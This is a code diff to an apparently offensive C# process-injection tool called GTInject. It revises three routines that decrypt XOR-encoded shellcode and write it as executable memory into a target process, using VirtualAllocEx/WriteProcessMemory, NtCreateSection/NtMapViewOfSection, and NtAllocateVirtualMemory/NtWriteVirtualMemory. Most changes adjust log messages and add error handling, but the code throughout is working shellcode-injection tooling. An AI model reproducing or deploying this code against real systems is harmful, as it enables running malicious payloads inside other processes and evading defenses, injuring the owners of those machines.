@@ -3,6 +3,7 @@ using System.Runtime.InteropServices;
 using System.Diagnostics;
 using System.Runtime.CompilerServices;
 using System.Net.NetworkInformation;
+using System.Security.Cryptography;
 
 namespace GTInject.memoryOptions
 {
@@ -19,11 +20,10 @@ namespace GTInject.memoryOptions
                 case 201:
                     return memopt201(binsrctype, binsrcpath, xorkey, pid);
                 default:
-                    Console.WriteLine( " not a valid memory allocation option integer");
+                    Console.WriteLine("[-] Not a valid memory allocation option integer");
                     return (IntPtr.Zero, null);
             }
-            Console.WriteLine(  " [-] Bad memory allocation technique, enter an integer Memory Option selection");
-            return (IntPtr.Zero, null);
+
         }
         private static (IntPtr, Process) memopt100(string binLocation, string bytePath, string xorkey, int ProcID)
         {
@@ -32,26 +32,26 @@ namespace GTInject.memoryOptions
             // OPTION 100 == VirtualAllocEx && WriteProcessMemory (WINAPI)
             /////////////////////////////////////
 
-            Console.WriteLine(  "  Allocate memory using WinAPIs - VirtualAllocEx and WriteProcMem");
+            Console.WriteLine("     Allocate memory using WinAPIs - VirtualAllocEx and WriteProcMem");
 
             // Got what we need to start injection
             var plainBytes = GetShellcode.GetShellcode.readAndDecryptBytes(binLocation, bytePath, xorkey);
                 
             Process pid = Process.GetProcessById(ProcID);
-            Console.WriteLine( " have pid " + pid.Id + " " + pid);
+            Console.WriteLine("     have pid " + pid.Id + " " + pid);
             IntPtr vMemAddr = VirtualAllocEx(pid.Handle, (IntPtr)0, (uint)plainBytes.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteRead);
-            Console.WriteLine(  " allocated mem at address " + vMemAddr);
+            Console.WriteLine("     allocated mem at address " + vMemAddr);
             IntPtr outsize;
             var writeResp = WriteProcessMemory(pid.Handle, vMemAddr, plainBytes, plainBytes.Length, out outsize); // Smart enough to virtual Protect the location to writable, then change back automatically
 
             if (writeResp)
             {
-                Console.WriteLine( " Wrote to Mem using VirtAllocEx and WriteProcMem WINAPIs: " + writeResp);
+                Console.WriteLine("[+] Wrote to Mem using VirtAllocEx and WriteProcMem WINAPIs: " + writeResp);
                 return (vMemAddr, pid);
             }
             else
             {
-                Console.WriteLine(" Failed to write with VirtAllocEx and WriteProcMem WINAPIs");
+                Console.WriteLine("[-] Failed to write with VirtAllocEx and WriteProcMem WINAPIs");
                 return (IntPtr.Zero, null);
             }
         }
@@ -64,15 +64,17 @@ namespace GTInject.memoryOptions
             // OPTION 200 == NtCreateSection, NtMapViewOfSection, RtlCopyMemory (NTAPI)
             /////////////////////////////////////
             // https://github.com/tasox/CSharp_Process_Injection/blob/main/04.%20Process_Injection_template_(Low%20Level%20Windows%20API)%20-%20Modify%20Permissions/Program.cs 
+            Console.WriteLine("     Allocate memory using NTAPIs - NtCreateSection, NtMapViewOfSection, RtlCopyMemory");
+
             var plainBytes = GetShellcode.GetShellcode.readAndDecryptBytes(binLocation, bytePath, xorkey);
 
             int len = plainBytes.Length;
             uint bufferLength = (uint)len;
             IntPtr sectionHandler = new IntPtr();
-            Console.WriteLine(  " section perms value : " + (uint)(NtSectionPerms.SECTION_MAP_READ | NtSectionPerms.SECTION_MAP_WRITE | NtSectionPerms.SECTION_MAP_EXECUTE));
+            Console.WriteLine("     section perms value : " + (uint)(NtSectionPerms.SECTION_MAP_READ | NtSectionPerms.SECTION_MAP_WRITE | NtSectionPerms.SECTION_MAP_EXECUTE));
             long createSection = (int)NtCreateSection(ref sectionHandler, (uint)(NtSectionPerms.SECTION_MAP_READ | NtSectionPerms.SECTION_MAP_WRITE | NtSectionPerms.SECTION_MAP_EXECUTE), IntPtr.Zero, ref bufferLength, (uint)(MemoryProtection.ExecuteReadWrite), (uint)(SEC_COMMIT), IntPtr.Zero);
-            Console.WriteLine(  " createsection long resp : " + createSection);
-            Console.WriteLine(  " section handler : " + sectionHandler);
+            Console.WriteLine("     createsection long resp : " + createSection);
+            Console.WriteLine("     section handler : " + sectionHandler);
             // Map the new section for the LOCAL process.
             IntPtr localBaseAddress = new IntPtr();
             int sizeLocal = plainBytes.Length;
@@ -80,8 +82,8 @@ namespace GTInject.memoryOptions
 
             Process localProc = Process.GetCurrentProcess();
             long mapSectionLocal = NtMapViewOfSection(sectionHandler, localProc.Handle, ref localBaseAddress, IntPtr.Zero, IntPtr.Zero, out offsetSectionLocal, out sizeLocal, 2, 0, (uint)(MemoryProtection.ReadWrite));
-            Console.WriteLine(  " local section mapped : long resp : " + mapSectionLocal);
-            Console.WriteLine(  " local base address " + localBaseAddress);
+            Console.WriteLine("     local section mapped : long resp : " + mapSectionLocal);
+            Console.WriteLine("     local base address " + localBaseAddress);
 
             // Map the new section for the REMOTE process.
             IntPtr remoteBaseAddress = new IntPtr();
@@ -91,21 +93,30 @@ namespace GTInject.memoryOptions
             Process remoteProc = Process.GetProcessById(ProcID);
 
             long mapSectionRemote = NtMapViewOfSection(sectionHandler, remoteProc.Handle, ref remoteBaseAddress, IntPtr.Zero, IntPtr.Zero, out offsetSectionRemote, out sizeRemote, 2, 0, (uint)(MemoryProtection.ExecuteRead));
-            Console.WriteLine(  " mapSectionRemote resp : " + mapSectionRemote);
-            Console.WriteLine(  " remoteBaseAddress " + remoteBaseAddress);
+            Console.WriteLine("     mapSectionRemote resp : " + mapSectionRemote);
+            Console.WriteLine("     remoteBaseAddress " + remoteBaseAddress);
 
             //RtlCopyMemory takes an IntPtr, take our Byte array into a newly allocated unmanaged pointer temporarily
             IntPtr unmanagedPointer = Marshal.AllocHGlobal(plainBytes.Length);
-            Console.WriteLine(  " created unmanaged ptr " + unmanagedPointer);
+            Console.WriteLine("     created unmanaged ptr " + unmanagedPointer);
             Marshal.Copy(plainBytes, 0, unmanagedPointer, plainBytes.Length);
-            Console.WriteLine(  " marshal copied to unmgd ptr ");
-            RtlCopyMemory(localBaseAddress, unmanagedPointer, (uint)plainBytes.Length);
-            Console.WriteLine( " RtlCopyMemory execd");
-            Marshal.FreeHGlobal(unmanagedPointer);
+            Console.WriteLine("     marshal copied to unmgd ptr ");
+/*            RtlCopyMemory(localBaseAddress, unmanagedPointer, (uint)plainBytes.Length);
+            Console.WriteLine( "    RtlCopyMemory execd");
+            Marshal.FreeHGlobal(unmanagedPointer);*/
 
-            return (remoteBaseAddress, remoteProc);
-
-
+            try
+            {
+                RtlCopyMemory(localBaseAddress, unmanagedPointer, (uint)plainBytes.Length);
+                Console.WriteLine("     RtlCopyMemory execd");
+                Marshal.FreeHGlobal(unmanagedPointer);
+                Console.WriteLine("[+] Wrote to Mem using NTAPIs - NtCreateSection, NtMapViewOfSection, RtlCopyMemory");
+                return (remoteBaseAddress, remoteProc);
+            }
+            catch {
+                Console.WriteLine("[-] Failed to write using NTAPIs - NtCreateSection, NtMapViewOfSection, RtlCopyMemory");
+                return (IntPtr.Zero, null);
+            }
         }
 
 
@@ -115,6 +126,7 @@ namespace GTInject.memoryOptions
             // OPTION 201 == NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory
             /////////////////////////////////////
             /// https://github.com/tasox/CSharp_Process_Injection 
+            Console.WriteLine("     Allocate memory using NTAPIs - NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory");
 
             var plainBytes = GetShellcode.GetShellcode.readAndDecryptBytes(binLocation, bytePath, xorkey);
 
@@ -124,16 +136,20 @@ namespace GTInject.memoryOptions
 
             // Memory Allocation
             IntPtr NtAllocResult = NtAllocateVirtualMemory(remoteProc.Handle, ref baseAddress, IntPtr.Zero, ref regionSize, (uint)(AllocationType.Commit | AllocationType.Reserve), (uint)(MemoryProtection.ReadWrite));
-            Console.WriteLine(  " NTAlloc resp : " + NtAllocResult);
-            Console.WriteLine(  " NTAlloc address " + baseAddress);
+            Console.WriteLine("     NTAlloc resp : " + NtAllocResult);
+            Console.WriteLine("     NTAlloc address " + baseAddress);
 
             int NtWriteProcess = NtWriteVirtualMemory(remoteProc.Handle, baseAddress, plainBytes, (uint)plainBytes.Length, out uint wr);
-            Console.WriteLine(  " NtWrite resp : " + NtWriteProcess);
-            Console.WriteLine(  " written " + wr);
+            Console.WriteLine("     NtWrite resp : " + NtWriteProcess);
+            Console.WriteLine("     written " + wr);
             uint flOld = 0;
             uint sectionSize = (uint)plainBytes.Length;
             uint NtVirtProtResp = NtProtectVirtualMemory(remoteProc.Handle, ref baseAddress, ref sectionSize, (uint)(MemoryProtection.ExecuteRead), ref flOld);
-            Console.WriteLine(  " NtProtect resp : " + NtVirtProtResp);
+            Console.WriteLine("     NtProtect resp : " + NtVirtProtResp);
+            if (baseAddress != IntPtr.Zero)
+            {
+                Console.WriteLine("[+] Wrote to Mem using NTAPIs - NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory");
+            }
             return (baseAddress, remoteProc);
         }
 
